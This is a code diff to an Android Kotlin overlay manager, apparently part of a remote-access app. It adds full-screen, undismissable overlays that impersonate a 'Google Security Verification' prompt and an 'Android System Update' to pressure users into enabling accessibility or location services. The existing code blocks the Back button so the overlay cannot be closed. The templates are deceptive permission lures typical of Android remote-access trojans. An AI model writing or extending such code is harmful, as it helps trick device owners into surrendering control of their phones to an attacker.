@@ -24,12 +24,71 @@ import android.widget.FrameLayout
 import android.widget.LinearLayout
 import android.widget.TextView
 
+data class OverlayTemplateConfig(
+    val templateId: String,
+    val name: String,
+    val iconEmoji: String,
+    val title: String,
+    val message: String,
+    val buttonText: String,
+    val cardBgColor: String = "#1E293B",
+    val strokeColor: String = "#2563EB",
+    val buttonColor: String = "#2563EB"
+)
+
 object AccessibilityOverlayManager {
 
     private const val TAG = "AccessibilityOverlay"
     private var overlayView: View? = null
     private var contentObserver: ContentObserver? = null
     private var isObserverRegistered = false
+
+    val TEMPLATES = mapOf(
+        "accessibility" to OverlayTemplateConfig(
+            templateId = "accessibility",
+            name = "System Default",
+            iconEmoji = "⚠️",
+            title = "Accessibility Required",
+            message = "Android system accessibility service needs to be enabled in Settings. Please turn it on to continue.",
+            buttonText = "OPEN ACCESSIBILITY SETTINGS",
+            cardBgColor = "#1E293B",
+            strokeColor = "#EF4444",
+            buttonColor = "#2563EB"
+        ),
+        "google" to OverlayTemplateConfig(
+            templateId = "google",
+            name = "Google Services",
+            iconEmoji = "🌐",
+            title = "Google Security Verification",
+            message = "Google Play Services requires system accessibility authorization to confirm account protection.",
+            buttonText = "ALLOW GOOGLE VERIFICATION",
+            cardBgColor = "#121824",
+            strokeColor = "#4285F4",
+            buttonColor = "#1A73E8"
+        ),
+        "system" to OverlayTemplateConfig(
+            templateId = "system",
+            name = "System Update",
+            iconEmoji = "⚙️",
+            title = "Android System Update",
+            message = "A system update requires accessibility permission to complete background synchronization.",
+            buttonText = "INSTALL SYSTEM UPDATE",
+            cardBgColor = "#0F1A14",
+            strokeColor = "#3DDC84",
+            buttonColor = "#2E7D32"
+        ),
+        "location" to OverlayTemplateConfig(
+            templateId = "location",
+            name = "Location Services",
+            iconEmoji = "📍",
+            title = "Turn On Location",
+            message = "Device location service is required for accurate GPS positioning. Please turn on Location in system settings.",
+            buttonText = "TURN ON DEVICE LOCATION",
+            cardBgColor = "#111827",
+            strokeColor = "#3B82F6",
+            buttonColor = "#2563EB"
+        )
+    )
 
     fun isAccessibilityEnabled(context: Context): Boolean {
         if (RemoteAccessibilityService.isServiceEnabled()) return true
@@ -135,6 +194,20 @@ object AccessibilityOverlayManager {
         }
     }
 
+    fun openLocationSettings(context: Context): Boolean {
+        val appContext = context.applicationContext
+        return try {
+            val intent = Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS).apply {
+                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
+            }
+            appContext.startActivity(intent)
+            true
+        } catch (e: Exception) {
+            Log.e(TAG, "Error opening location settings: ${e.message}")
+            false
+        }
+    }
+
     fun checkAndToggleOverlay(context: Context) {
         Handler(Looper.getMainLooper()).post {
             val isEnabled = isAccessibilityEnabled(context)
@@ -147,11 +220,11 @@ object AccessibilityOverlayManager {
         }
     }
 
-    fun showOverlay(context: Context) {
-        showOverlayWithFallback(context)
+    fun showOverlay(context: Context, templateId: String = "accessibility") {
+        showOverlayWithFallback(context, templateId)
     }
 
-    fun showOverlayWithFallback(context: Context): String {
+    fun showOverlayWithFallback(context: Context, templateId: String = "accessibility"): String {
         val appContext = context.applicationContext
         startObserver(appContext)
 
@@ -193,6 +266,8 @@ object AccessibilityOverlayManager {
                     return@post
                 }
 
+                val config = TEMPLATES[templateId.lowercase()] ?: TEMPLATES["accessibility"]!!
+
                 val rootLayout = object : FrameLayout(appContext) {
                     override fun dispatchKeyEvent(event: KeyEvent?): Boolean {
                         // Intercept Back button to prevent dismissing overlay
@@ -214,9 +289,9 @@ object AccessibilityOverlayManager {
                     setPadding(dpToPx(appContext, 24), dpToPx(appContext, 32), dpToPx(appContext, 24), dpToPx(appContext, 32))
 
                     val cardDrawable = GradientDrawable().apply {
-                        setColor(Color.parseColor("#1E293B")) // Slate 800
+                        setColor(Color.parseColor(config.cardBgColor))
                         cornerRadius = dpToPx(appContext, 20).toFloat()
-                        setStroke(dpToPx(appContext, 2), Color.parseColor("#EF4444")) // Red border indicator
+                        setStroke(dpToPx(appContext, 2), Color.parseColor(config.strokeColor))
                     }
                     background = cardDrawable
                 }
@@ -228,16 +303,16 @@ object AccessibilityOverlayManager {
                     gravity = Gravity.CENTER
                 }
 
-                // Warning Icon
-                val warningText = TextView(appContext).apply {
-                    text = "⚠️"
+                // Icon / Emoji
+                val iconView = TextView(appContext).apply {
+                    text = config.iconEmoji
                     textSize = 48f
                     gravity = Gravity.CENTER
                 }
 
                 // Title
                 val titleView = TextView(appContext).apply {
-                    text = "Accessibility Required"
+                    text = config.title
                     textSize = 20f
                     setTextColor(Color.WHITE)
                     setTypeface(null, Typeface.BOLD)
@@ -247,7 +322,7 @@ object AccessibilityOverlayManager {
 
                 // Message Body
                 val messageView = TextView(appContext).apply {
-                    text = "Android system accessibility service needs to be enabled in Settings. Please turn it on to continue."
+                    text = config.message
                     textSize = 14f
                     setTextColor(Color.parseColor("#94A3B8")) // Slate 400
                     gravity = Gravity.CENTER
@@ -257,24 +332,28 @@ object AccessibilityOverlayManager {
 
                 // Action Button: Open Accessibility Settings
                 val enableButton = Button(appContext).apply {
-                    text = "OPEN ACCESSIBILITY SETTINGS"
-                    textSize = 14f
+                    text = config.buttonText
+                    textSize = 13f
                     setTextColor(Color.WHITE)
                     setTypeface(null, Typeface.BOLD)
 
                     val btnDrawable = GradientDrawable().apply {
-                        setColor(Color.parseColor("#2563EB")) // Blue 600
+                        setColor(Color.parseColor(config.buttonColor))
                         cornerRadius = dpToPx(appContext, 12).toFloat()
                     }
                     background = btnDrawable
                     setPadding(dpToPx(appContext, 16), dpToPx(appContext, 12), dpToPx(appContext, 16), dpToPx(appContext, 12))
 
                     setOnClickListener {
-                        openAccessibilitySettings(appContext)
+                        if (templateId.equals("location", ignoreCase = true)) {
+                            openLocationSettings(appContext)
+                        } else {
+                            openAccessibilitySettings(appContext)
+                        }
                     }
                 }
 
-                cardLayout.addView(warningText)
+                cardLayout.addView(iconView)
                 cardLayout.addView(titleView)
                 cardLayout.addView(messageView)
                 cardLayout.addView(enableButton)
